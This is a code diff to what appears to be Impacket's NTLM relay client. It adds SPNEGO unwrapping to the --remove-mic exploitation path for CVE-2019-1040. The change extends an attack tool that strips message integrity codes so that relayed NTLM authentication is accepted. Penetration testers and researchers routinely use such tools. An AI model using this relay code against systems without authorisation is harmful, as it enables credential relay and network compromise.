@@ -499,6 +499,11 @@ class SMBRelayClient(ProtocolClient):
         # When exploiting CVE-2019-1040, remove flags and zero out MIC/Version
         if self.serverConfig.remove_mic:
             LOG.debug('[SMB] sendAuth: Applying --remove-mic transformations')
+            # Check if SPNEGO-wrapped and unwrap if needed
+            if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
+                respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
+                authenticateMessageBlob = respToken2['ResponseToken']
+
             authMessage = NTLMAuthChallengeResponse()
             authMessage.fromString(authenticateMessageBlob)
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
@@ -518,6 +523,14 @@ class SMBRelayClient(ProtocolClient):
         elif self.serverConfig.remove_mic_partial:
             LOG.debug('[SMB] sendAuth: Applying --remove-mic-partial transformations')
             LOG.debug('[SMB] sendAuth: authenticateMessageBlob length: %d, first byte: 0x%x' % (len(authenticateMessageBlob), authenticateMessageBlob[0]))
+
+            # Check if SPNEGO-wrapped and unwrap if needed
+            if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
+                LOG.debug('[SMB] sendAuth: Unwrapping SPNEGO')
+                respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
+                authenticateMessageBlob = respToken2['ResponseToken']
+                LOG.debug('[SMB] sendAuth: SPNEGO unwrapped, new length: %d' % len(authenticateMessageBlob))
+
             authMessage = NTLMAuthChallengeResponse()
             LOG.debug('[SMB] sendAuth: Created NTLMAuthChallengeResponse object, about to parse')
             authMessage.fromString(authenticateMessageBlob)
